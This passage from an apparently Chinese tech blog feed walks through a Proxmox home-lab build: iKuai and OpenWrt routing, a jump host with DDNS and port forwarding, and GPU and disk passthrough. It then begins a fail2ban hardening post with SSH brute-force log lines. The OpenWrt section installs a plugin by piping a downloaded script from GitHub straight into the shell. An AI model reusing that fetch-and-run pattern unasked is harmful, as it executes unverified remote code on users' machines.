title="网络设置"></a>网络设置</h3><p>在安装步骤中选择一个网卡，这张网卡对应的物理网口就是用来提供 LAN 口网络的，然后输入一个网关地址（这里的网关地址要作为后面我们安装 iKuai 的网关地址），并且输入一个管理地址，这里的网段要一致，比如网关地址为 192.168.100.1，那么管理地址应该为 192.168.100.x。</p><p>安装完成后将电脑网线接入到主机的 LAN 口，开始设置 PVE 系统。访问刚才设置的管理地址，进入管理页面，点击网络以后可以看到如下设备：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081517307.png" alt=""></p><p>enp1s0 和 enp2s0 都是物理网卡，对应主机的两个网口。vmbr0 是 PVE 内部的虚拟网桥，是桥接在 LAN 口的物理网卡上的，在创建虚拟机时网卡一般都会选择这个虚拟网桥，相当于操作系统使用网线接入了主机的 LAN 口网络。enp2s0 目前是空闲的状态，这个我们在安装 ikuai 的时候才会有用，需要将其作为 wan 口对应物理设备。</p><h3 id="分区合并"><a href="#分区合并" class="headerlink" title="分区合并"></a>分区合并</h3><p>默认的，pve 会创建两个分区，一个 local 分区用于存放用户上传的镜像和其他数据，一个 local-lvm 分区用于为虚拟机创建存储卷。但是对于一般或者磁盘比较小的用户来说，没有必要区分分区，两个分区可以合并为一个，并不影响使用：</p><p>删除 local-lvm分区：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvremove pve/data</span><br></pre></td></tr></table></figure><p>把 local-lvm空间合并给 local分区：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lvextend -rl +100%FREE pve/root</span><br><span class="line">resize2fs /dev/mapper/pve-root</span><br></pre></td></tr></table></figure><p>删除 local-lvm：网页登录，数据中心—存储—移除local-lvm分区</p><p>编辑 local，内容全选上，保存退出：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081538624.png" alt=""></p><h3 id="上传系统镜像"><a href="#上传系统镜像" class="headerlink" title="上传系统镜像"></a>上传系统镜像</h3><p>下载好需要安装的镜像后，进入下图所示位置上传镜像，然后就可以创建虚拟机了。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081545195.png" alt="image.png|400"></p><h1 id="3-iKuai"><a href="#3-iKuai" class="headerlink" title="3. iKuai"></a>3. iKuai</h1><h3 id="系统安装-1"><a href="#系统安装-1" class="headerlink" title="系统安装"></a>系统安装</h3><p>为了简化 PVE 内部的网络管理，一般都会为其安装一个软路由系统来管理内部的网络，此外既然安装了软路由系统，就可以将其作为家庭网络的入口来进行拨号上网，就像上面的网络结构中，光猫的下游设备就是我们的小主机。</p><p>简单理解来说，N100 主机就相当于一个没有无线功能的主路由器，iKuai 就是为这个路由器来提供操作系统的，至于家庭中的无线路由器，只是作为这个主路由器的子路由接入到家庭网络中的。</p><p>按正常流程创建 iKuai 虚拟机，网络仍选择 vmbr0，进入虚拟机后此时应该只能看到一个网络接口，将其绑定为 LAN 口后并选择设置 LAN/WAN 地址，将 LAN 口地址设置为我们创建 PVE 时填写的网关地址 192.168.100.1。</p><p>然后进入 PVE 虚拟机的硬件管理中，点击添加 - PCI 设备：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081551348.png" alt="image.png|400"></p><p>选择原始设备并选中另外一张我们要用作 WAN 口的网卡（也就是我们在安装 PVE 时没有选择到的那张空闲网卡，一般编号 01 对应 enp1s0，编号 02 对应enp2s0）：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081552618.png" alt="image.png|400"></p><p>这里的操作是将空闲的网卡直通给了 iKuai 系统，然后进入 iKuai 系统后，查看一下桥接的网卡是否被正常识别并自动绑定为 WAN 口，如果没有的话要手动在“设置网卡绑定”选项中手动绑定一下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081602410.png" alt="image.png|400"></p><p>然后进入 iKuai 的管理页面（LAN 口的地址），可以看到 LAN 口和 WAN 口正常工作了：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081603527.png" alt="image.png|400"></p><p>然后就是常规的路由器设置，将光猫连接 WAN 口，设置网络拨号、开启 DHCP，注意将 DHCP 分配的网段要设置的跟 iKuai 和 PVE 管理地址的网段一致。</p><h3 id="开启-IPv6"><a href="#开启-IPv6" class="headerlink" title="开启 IPv6"></a>开启 IPv6</h3><p>在 IPv6 设置中添加或者启用 IPv6 外网配置：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081607214.png" alt="image.png|400"></p><p>选择 DHCPv6 动态获取后，如果光猫支持，就会从上游获取到运营商分配的 IPv6 地址、网关、前缀、DNS 信息，如果失败的话需要将光猫改为桥接模式。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081608157.png" alt="image.png|400"><br>为了给内网下发 IPv6 地址前缀，还需要配置对应的内网接口，这里建议开启 DHCPv6，并使用无状态 + 有状态模式（有状态就是 DHCPv6 下发一个 IPv6 地址，无状态就是接入设备获取到 IPv6 前缀后自动生成一个后缀），DNS 服务器可以设置为上一步外网配置中运营商下发的 DNS：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504081619326.png" alt="image.png|400"></p><h1 id="4-跳板机"><a href="#4-跳板机" class="headerlink" title="4. 跳板机"></a>4. 跳板机</h1><p>这里加入的跳板机其实是为了作为外部接入内部网络的入口，同时还提供了一个透明网关的功能，用于内部设备的科学上网。</p><h3 id="DDNS"><a href="#DDNS" class="headerlink" title="DDNS"></a>DDNS</h3><p>通常服务商分配的 IPv6 前缀是动态的，因此设备的 IPv6 地址可能是会变化的，DDNS 服务就是时刻获取设备的 IPv6 地址，发生改变后就主动通知域名的服务商来修改域名绑定的地址，外部只需要访问域名就能稳定的访问到内部网络了。</p><p>这里推荐使用 DDNS GO 来搭建 DDNS 服务：<a href="https://github.com/jeessy2/ddns-go">https://github.com/jeessy2/ddns-go</a></p><p>这样我们内部就有了一个 IPv6 访问的入口了，我们可以从外网通过 ssh 等服务来接入内网服务。配合 iKuai 的防火墙功能，我们可以只开放跳板机的 IPv6 网络访问，就能控制外部的网络入口了。当然这就也要求跳板机的安全行足够高，可以配合防火墙 + fail2ban + 2FA 认证来进一步加固跳板机的访问权限，具体可以参考我的这篇文章：<a href="https://blog.esunr.site/2025/04/387549224301.html#fail2ban">《使用防火墙与 fail2ban 防止公网服务器被攻击》</a>。</p><h3 id="透明网关"><a href="#透明网关" class="headerlink" title="透明网关"></a>透明网关</h3><p>参考：<a href="https://blog.esunr.site/2025/04/ec8dc9f7a09d.html">《使用 Mihomo(Clash) 搭建透明网关，使局域网设备科学上网》</a></p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>内网转发的意义在于，你可以通过 DDNS 绑定跳板机的 IPv6 地址，然后从跳板机上进行端口转发，从而访问局域网其他设备的服务，这样也有助于在公网限制开放的端口数量，从而提升安全性。</p><p>可以使用 <a href="https://github.com/gdy666/lucky">lucky</a> 面板可视化的配置内网转发。</p><p>比如 PVE 的 win10 虚拟机开启了 3389 端口，那么就可以开放一个跳板机 13389 的端口，映射到 win10 主机 IP 上的 3389 端口，映射的目标 IP 也可以使用内网 IPv4。</p><h1 id="5-Openwrt-旁路由"><a href="#5-Openwrt-旁路由" class="headerlink" title="5. Openwrt 旁路由"></a>5. Openwrt 旁路由</h1><p>直接使用 Ubuntu + mihomo 内核实现的透明网关配置好后只能代理 TCP 包，UDP 包的代理设置会出现各种各样的问题，所以就没法加速游戏的数据包。与其说折腾内核，不如直接加入一个 OpenWrt 的旁路由系统，配合 nikki 插件（一个比 OpenClash 更易用的插件）来实现 UDP 和 TCP 的代理，达到游戏、网页访问都能加速的目的。</p><p>OpenWrt 系统的安装：</p><p>OpenWrt 可以选择使用 <a href="https://firmware-selector.immortalwrt.org/">immortalwrt</a> 和 <a href="https://openwrt.ai/">krwt</a> 这些第三方的整合系统，在满足了大部分的需求时也不会夹带私货。大部分视频博主的教程选用了 immortalwrt，因此后续的流程也是用 immoralwrt 做演示。</p><p>安装时推荐选择 SQUASHFS-COMBINED-EFI.IMG.GZ 格式的镜像，然后在本地解压后上传到 pve（MacOS 解压会报错，需要使用 unzip -d 指令来解压）。</p><p><a href="https://optimus-xs.github.io/posts/install-openwrt-in-pve/">安装流程参考</a></p><p>创建虚拟机时先不使用镜像，同时删除硬盘，并分配 CPU 和内存。</p><p>虚拟机创建好后，进入 PVE 终端执行镜像转化指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qm importdisk &lt;你的 vm id&gt; /var/lib/vz/template/iso/xxx.img local</span><br></pre></td></tr></table></figure><p>导入完成后，虚拟机的硬件列表里会出现硬盘，将其转化为 SATA。</p><p>然后配置启动引导项，将硬盘移动到最前方，然后就完成了 OpenWrt 的安装。</p><p>安装完成之后进入系统，编辑 <code>/etc/config/network</code> 设置 IP、DNS、Gateway 这几项，设置参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">config interface &#x27;lan&#x27;</span><br><span class="line">option device &#x27;br-lan&#x27;</span><br><span class="line">option proto &#x27;static&#x27;</span><br><span class="line">option ipaddr &#x27;192.168.1.2&#x27;</span><br><span class="line">option netmask &#x27;255.255.255.0&#x27;</span><br><span class="line">option gateway &#x27;192.168.1.1&#x27;</span><br><span class="line">option ip6assign &#x27;60&#x27;</span><br><span class="line">list dns &#x27;192.168.1.1&#x27;</span><br></pre></td></tr></table></figure><p>进入 immortalwrt 后，安装 luci 主题：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opkg install luci</span><br></pre></td></tr></table></figure><p>安装 nikki：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O - https://github.com/nikkinikki-org/OpenWrt-nikki/raw/refs/heads/main/feed.sh | ash</span><br></pre></td></tr></table></figure><h1 id="6-硬件直通"><a href="#6-硬件直通" class="headerlink" title="6. 硬件直通"></a>6. 硬件直通</h1><p>在虚拟机的环境下，一般是通过桥接或者虚拟化来连接物理设备的，但是在这种情况下部分硬件是不能够很好的发挥作用的，比如你想利用显卡硬解视频、HDMI 输出画面，那么就需要将这些硬件设备直通给虚拟机使用，这个过程就叫做硬件直通。</p><h3 id="windows-单显卡直通"><a href="#windows-单显卡直通" class="headerlink" title="windows 单显卡直通"></a>windows 单显卡直通</h3><blockquote><p>该方式不借助 sriov 虚拟化，是直接将显卡 PCI 直通给了 windows 系统，其他虚拟机无法共用。但是该方法相对比较简单，而且设置完成后 HDMI 能够直接直通显示虚拟机画面，无需额外设置。原版教程：<a href="https://www.right.com.cn/forum/thread-8413927-1-1.html">https://www.right.com.cn/forum/thread-8413927-1-1.html</a></p></blockquote><p>PVE 启动内核IOMMU支持：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改引导内核</span></span><br><span class="line">vim /etc/default/grub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;quiet intel_iommu=on iommu=pt pcie_acs_override=downstream&quot;</span></span><br></pre></td></tr></table></figure><p>更新 GRUB 配置  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure><p>屏蔽驱动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/modprobe.d/pve-blacklist.conf  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加内容</span></span><br><span class="line"><span class="comment"># block INTEL driver  </span></span><br><span class="line">blacklist i915  </span><br><span class="line">blacklist snd_hda_intel  </span><br><span class="line">blacklist snd_hda_codec_hdmi  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#允许不安全的设备中断  </span></span><br><span class="line">options vfio_iommu_type1 allow_unsafe_interrupts=1</span><br></pre></td></tr></table></figure><p>更新 initramfs 并重启：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update-initramfs -u -k all  </span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>增加 module：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/modules </span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加内容</span></span><br><span class="line">vfio  </span><br><span class="line">vfio_iommu_type1  </span><br><span class="line">vfio_pci  </span><br><span class="line">vfio_virqfd  </span><br><span class="line"></span><br><span class="line"><span class="comment">#新版PVE8.3自动增加的  </span></span><br><span class="line">coretemp</span><br></pre></td></tr></table></figure><p>将设备加入进 vfio：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看设备 ID</span></span><br><span class="line">lspci -D -nnk | grep VGA</span><br><span class="line">0000:00:02.0 VGA compatible controller [0300]: Intel Corporation Alder Lake-N [UHD Graphics] [8086:46d1]</span><br><span class="line"></span><br><span class="line"><span class="comment"># id就是：8086:46d1，在你的PVE上运行，看得到的id是多少，因为下面vfio.conf修改为你自己的id。</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/modprobe.d/vfio.conf  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入内容，将 id 替换为上面查询的 ID</span></span><br><span class="line">options vfio-pci ids=8086:46d1</span><br></pre></td></tr></table></figure><p>下载 N100 vbios（用于让虚拟机识别显卡硬件）：<a href="https://github.com/gangqizai/igd/tree/main">https://github.com/gangqizai/igd/tree/main</a>，将 <code>gen12_gop.rom</code> 和 <code>gen12_igd.rom</code> 复制到 <code>/use/share/kvm/</code> 目录下。</p><p>手动修改你的wind10虚拟机参数，只看重点部分是否相同：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 100 替换为虚拟机的 ID</span></span><br><span class="line">vim /etc/pve/qemu-server/100.conf  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 核对一下内容</span></span><br><span class="line">agent: 1  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#重点，作用是设置虚拟机与hostpci直通添加下面一行。  </span></span><br><span class="line">args: -<span class="built_in">set</span> device.hostpci0.addr=02.0 -<span class="built_in">set</span> device.hostpci0.x-igd-gms=0x2 -<span class="built_in">set</span> device.hostpci0.x-igd-opregion=on  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#重点，BIOS选“OVMF(UEFI)”，不能选SeaBIOS  </span></span><br><span class="line">bios: ovmf  </span><br><span class="line">boot: order=scsi0;ide0;net0  </span><br><span class="line">cores: 3  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#重点，处理器选“host”  </span></span><br><span class="line">cpu: host  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#重点，直通显卡BIOS加载  </span></span><br><span class="line">hostpci0: 0000:00:02.0,legacy-igd=1,romfile=gen12_igd.rom</span><br><span class="line">  </span><br><span class="line"><span class="comment">#重点，直通显卡自带的HDMI声卡，不然HDMI接电视没有声音</span></span><br><span class="line">hostpci1: 0000:00:1f.3</span><br><span class="line">  </span><br><span class="line">ide0: none,media=cdrom  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#机型选“pc-i440fx-8.0”  </span></span><br><span class="line">machine: pc-i440fx-8.0  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#新版PVE8.3“pc-i440fx-8.1”（不能选q35）  </span></span><br><span class="line"><span class="comment">#machine: pc-i440fx-8.1  </span></span><br><span class="line">  </span><br><span class="line">memory: 16384  </span><br><span class="line">meta: creation-qemu=8.1.5,ctime=1719398459  </span><br><span class="line">name: win10-ip56  </span><br><span class="line">net0: virtio=BC:24:11:4B:FF:CE,bridge=vmbr0  </span><br><span class="line">numa: 0  </span><br><span class="line">onboot: 1  </span><br><span class="line">ostype: win10  </span><br><span class="line">scsi0: local-lvm:vm-100-disk-1,iothread=1,size=200G,ssd=1  </span><br><span class="line">scsihw: virtio-scsi-single  </span><br><span class="line">smbios1: uuid=97a88487-8081-4213-923f-34fc4756a37b  </span><br><span class="line">sockets: 1  </span><br><span class="line">startup: order=30  </span><br><span class="line">unused0: local-lvm:vm-100-disk-0  </span><br><span class="line">usb0: host=3-4  </span><br><span class="line"><span class="comment">#AX211 USB蓝牙直通  </span></span><br><span class="line">usb1: host=8087:0033  </span><br><span class="line">usb2: host=3-1.4  </span><br><span class="line">usb3: host=24ae:1008  </span><br><span class="line">usb4: host=4-3  </span><br><span class="line">usb5: host=062a:4101  </span><br><span class="line">usb6: host=4-4  </span><br><span class="line">usb7: host=3-5  </span><br><span class="line">usb8: host=2-2  </span><br><span class="line">usb9: host=3-1  </span><br><span class="line"><span class="comment">#重点，关闭虚拟VGA显卡，用intel直通显卡显示。  </span></span><br><span class="line">vga: none  </span><br><span class="line">vmgenid: 959ded06-690b-41c4-bbbb-8d4bcc5dfa09</span><br></pre></td></tr></table></figure><p>进入 windows 虚拟机后如果显示设备异常，可以前往 intel 官网下载处理器对应的显卡驱动，比如 N100 可以使用：<a href="https://www.intel.cn/content/www/cn/zh/download/785597/intel-arc-iris-xe-graphics-windows.html?wapkw=n100">https://www.intel.cn/content/www/cn/zh/download/785597/intel-arc-iris-xe-graphics-windows.html?wapkw=n100</a></p><h3 id="硬盘直通"><a href="#硬盘直通" class="headerlink" title="硬盘直通"></a>硬盘直通</h3><blockquote><p>参考教程：<a href="https://foxi.buduanwang.vip/virtualization/1754.html/">https://foxi.buduanwang.vip/virtualization/1754.html/</a></p></blockquote><p>如果宿主主机有第二块硬盘，希望直通给虚拟机使用，这种情况下推荐使用 PVE 磁盘控制器的方式直通。</p><p>如果我们直接在虚拟机硬件设置中选择添加硬盘，只会显示 PVE 的系统硬盘，是不会显示其他硬盘的，因此首先我们要找到其他硬盘的硬件挂载地址，在控制台输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /dev/disk/by-id/|grep -v dm|grep -v lvm|grep -v part</span><br></pre></td></tr></table></figure><p>会输出所有挂载内容，如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@pve:~<span class="comment"># ls -la /dev/disk/by-id/|grep -v dm|grep -v lvm|grep -v part</span></span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x 2 root root 540 Apr 28 16:39 .</span><br><span class="line">drwxr-xr-x 6 root root 120 Mar  3 15:52 ..</span><br><span class="line">lrwxrwxrwx 1 root root  13 Apr 28 16:39 nvme-eui.01000000010000005cd2e431fee65251 -&gt; ../../nvme2n1</span><br><span class="line">lrwxrwxrwx 1 root root  13 Mar  3 15:52 nvme-eui.334843304aa010020025385800000004 -&gt; ../../nvme1n1</span><br><span class="line">lrwxrwxrwx 1 root root  13 Apr 28 17:36 nvme-eui.334843304ab005400025385800000004 -&gt; ../../nvme0n1</span><br><span class="line">lrwxrwxrwx 1 root root  13 Apr 28 16:39 nvme-INTEL_SSDPE2KX020T8_BTLJ039307142P0BGN -&gt; ../../nvme2n1</span><br><span class="line">lrwxrwxrwx 1 root root  13 Mar  3 15:52 nvme-SAMSUNG_MZWLL800HEHP-00003_S3HCNX0JA01002 -&gt; ../../nvme1n1</span><br><span class="line">lrwxrwxrwx 1 root root  13 Apr 28 17:36 nvme-SAMSUNG_MZWLL800HEHP-00003_S3HCNX0JB00540 -&gt; ../../nvme0n1</span><br><span class="line">lrwxrwxrwx 1 root root   9 Mar  3 15:52 scsi-35000c500474cd7eb -&gt; ../../sda</span><br><span class="line">lrwxrwxrwx 1 root root   9 Mar  3 15:52 wwn-0x5000c500474cd7eb -&gt; ../../sda</span><br></pre></td></tr></table></figure><p>可以列出所有的硬盘，nvme 开头的是 nvme 硬盘，ata 开头是走 sata 或者 ata 通道的设备，scsi 是 scsi 设备-阵列卡 raid 或者是直通卡上的硬盘。</p><p>找到目标硬盘后，使用下面的指令来挂载硬盘到虚拟机上：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qm <span class="built_in">set</span> &lt;虚拟机 ID&gt; --sata1 /dev/disk/by-id/&lt;设备&gt;</span><br></pre></td></tr></table></figure><p>比如：<code>qm set 101 --sata1 /dev/disk/by-id/nvme-INTEL_SSDPE2KX020T8_BTLJ039307142P0BGN</code>，<code>--sata1</code> 表示协议以及序列号，对于pve来说，sata最多有6个设备。如果要使用sata类型直通，请勿超过sata5。</p><p>如果需要取消直通，可以使用命令 <code>qm set &lt;vmid&gt; --delete sata1</code>。</p><p>此外，还有 PCI 直通的方式，但是比这种挂载方式麻烦，感兴趣的自己看原教程。</p><h1 id="7-其他"><a href="#7-其他" class="headerlink" title="7. 其他"></a>7. 其他</h1><h3 id="磁盘扩容"><a href="#磁盘扩容" class="headerlink" title="磁盘扩容"></a>磁盘扩容</h3><p>选中要修改的磁盘大小后，选择磁盘操作 - 调整大小：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504291133415.png" alt="image.png|400"></p><p>调整完成之后还需要手动将新增加的磁盘容量分配给系统才能正常使用，以 Ubuntu 为例：</p><p>使用 <code>lsblk</code> 指令查看分区，会输出如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS</span><br><span class="line">// ... ...</span><br><span class="line">sda      8:0    0   120G  0 disk </span><br><span class="line">├─sda1   8:1    0     1M  0 part </span><br><span class="line">├─sda2   8:2    0   513M  0 part /boot/efi</span><br><span class="line">└─sda3   8:3    0  79.5G  0 part /</span><br><span class="line">sdb      8:16   0 931.5G  0 disk </span><br><span class="line">└─sdb1   8:17   0 931.5G  0 part /mnt/hdd</span><br></pre></td></tr></table></figure><p><code>sda</code> 和 <code>sdb</code> 分别表示插入主机的两块 SCSI/SATA 磁盘，<code>sda1</code> <code>sda2</code> <code>sda3</code> 表示磁盘上的三个分区。我们这次扩容的是 <code>sda</code> 磁盘，扩充到了 120G，但是磁盘上的系统分区 <code>sda3</code> 只有 80G，我们需要将扩充的 40G 空间分配给系统分区。</p><p>可以按照如下指令完成分区分配和重写分区表：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装分区工具</span></span><br><span class="line">apt install -y cloud-guest-utils</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将空闲分区分配给 sda3</span></span><br><span class="line"><span class="comment"># 这条命令会把 `/dev/sda3` 的结束扇区自动移到磁盘末尾，覆盖所有空余空间​</span></span><br><span class="line">growpart /dev/sda 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 ext4 文件系统扩展到新分区大小</span></span><br><span class="line">resize2fs /dev/sda3</span><br></pre></td></tr></table></figure><p>如果 <code>lsblk</code> 输出类似：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sda                         8:0    0   16G  0 disk </span><br><span class="line">├─sda1                      8:1    0    1M  0 part </span><br><span class="line">├─sda2                      8:2    0  1.8G  0 part /boot</span><br><span class="line">└─sda3                      8:3    0 14.2G  0 part </span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 252:0    0  8.2G  0 lvm  /</span><br></pre></td></tr></table></figure><p>说明当前操作系统采用了 lvm（逻辑卷管理）方式，相对于 part，我们还要对逻辑分区进行扩展，从而使用所有的 sda3 上的空间：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将剩余空间都分配给 ubuntu-lv 逻辑分区</span></span><br><span class="line">lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 ext4 文件系统扩展到新分区大小</span></span><br><span class="line">resize2fs /dev/ubuntu-vg/ubuntu-lv</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 网络原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用防火墙与 fail2ban 防止公网服务器被攻击</title>
      <link href="/2025/04/387549224301.html"/>
      <url>/2025/04/387549224301.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-自查服务器是否正在遭受攻击"><a href="#1-自查服务器是否正在遭受攻击" class="headerlink" title="1. 自查服务器是否正在遭受攻击"></a>1. 自查服务器是否正在遭受攻击</h1><p>我们将服务器的端口直接暴露在公网环境是比较危险的，服务器可能被人使用 fscan 等工具扫描端口、或者使用密码爆破来获取 mysql、ssh 的密码。你可以通过应用日志或者防火墙日志来自查端口是否有人在尝试进行密码爆破或者端口扫描。</p><p>以 SSH 登录为例，你可以执行 <code>sudo tail -f  /var/log/auth.log</code> 实时输出日志查看是否正在有人尝试使用 ssh 登录（如果没有日志文件则需要下载 <code>apt install rsyslog</code>），如下就是一个典型 ssh 登录失败日志，IP 为 196.251.67.42 的用户一直在尝试使用 root 用户进行登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Apr  2 15:05:34 cloud sshd[34625]: Failed password for root from 196.251.67.42 port 44972 ssh2</span><br><span class="line">Apr  2 15:05:34 cloud sshd[34625]: Received disconnect from 196.251.67.42 port 44972:11: Bye Bye [preauth]</span><br><span class="line">Apr  2 15:05:34 cloud sshd[34625]: Disconnected from authenticating user root 196.251.67.42 port 44972 [preauth]</span><br><span class="line">Apr  2 15:05:38 cloud sshd[34627]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=196.251.67.42  user=root</span><br><span class="line">Apr  2 15:05:41 cloud sshd[34627]: Failed password for root from 196.251.67.42 port 44982 ssh2</span><br><span class="line">Apr  2 15:05:42 cloud sshd[34627]: 